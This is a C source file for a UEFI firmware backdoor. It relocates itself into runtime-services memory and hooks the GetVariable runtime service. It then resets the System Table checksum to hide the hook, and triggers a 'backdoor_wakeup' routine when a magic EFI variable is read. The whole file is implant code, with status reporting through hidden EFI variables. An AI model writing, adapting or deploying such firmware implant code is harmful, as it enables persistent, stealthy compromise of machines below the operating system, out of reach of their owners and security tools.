#include "IndustryStandard/PeImage.h"
#include "Uefi/UefiBaseType.h"
#include "Uefi/UefiMultiPhase.h"
#include "Uefi/UefiSpec.h"
#include "efivars.h"
#include "globals.h"
#include "smm.h"

#include "locate.h"

static EFI_GET_VARIABLE gGetVariable_org;

static void init_hook(void * image_base);
static UINT64 gInitHook = (UINT64) &init_hook;

static void * runtimeservices_reallocate(void * image_base) {
    
    EFI_IMAGE_DOS_HEADER* dos_header = (EFI_IMAGE_DOS_HEADER *) image_base;
    EFI_IMAGE_NT_HEADERS64* nt64_headers = (EFI_IMAGE_NT_HEADERS64 *) 
        (((UINT64) image_base) + dos_header->e_lfanew);
    UINT64 size_of_image = nt64_headers->OptionalHeader.SizeOfImage;

    EFI_PHYSICAL_ADDRESS address = 0;
    EFI_STATUS status = gBS->AllocatePages(
                AllocateAnyPages,
                EfiRuntimeServicesCode,
                (size_of_image + 4095) / 4096,
                &address
            );
    if (status != EFI_SUCCESS) {
        set_backdoor_efivar_str(DxeVar, "Error: Cannot allocate EfiRuntimeServicesCode.");
        return NULL;
    }

    gBS->CopyMem((void *) address, image_base, size_of_image);
    
    return (void *) address;
}

static EFI_STATUS EFIAPI GetVariable_hook(CHAR16* name, EFI_GUID* guid, UINT32* attrib, UINTN* size, void* data) {
    if (is_backdoor_wakeup_var(name, guid))
        backdoor_wakeup();

    return gGetVariable_org(name, guid, attrib, size, data);
}

static void init_hook(void * image_base) {
    gGetVariable_org = gRT->GetVariable;

    EFI_TPL old_tpl;
    old_tpl = gBS->RaiseTPL(TPL_HIGH_LEVEL);

    gRT->GetVariable = &GetVariable_hook;
    gST->Hdr.CRC32 = 0;
    gBS->CalculateCrc32(&gST->Hdr, gST->Hdr.HeaderSize, &gST->Hdr.CRC32);

    gBS->RestoreTPL(old_tpl);

    set_backdoor_efivar_str(WakeupVar, "\x13\x37");
    set_backdoor_efivar_str(DxeVar, "DXE_INIT_OK");
}

void backdoor_dxe_entry(void) {
    
    void * image_base = get_image_base();
    void * new_location = runtimeservices_reallocate(image_base);

    if (new_location) {
        void (*far_init_hook)(void *) = ( void (*)(void *) )
            ((UINT64) new_location) + gInitHook;

        far_init_hook(new_location);
    }
}
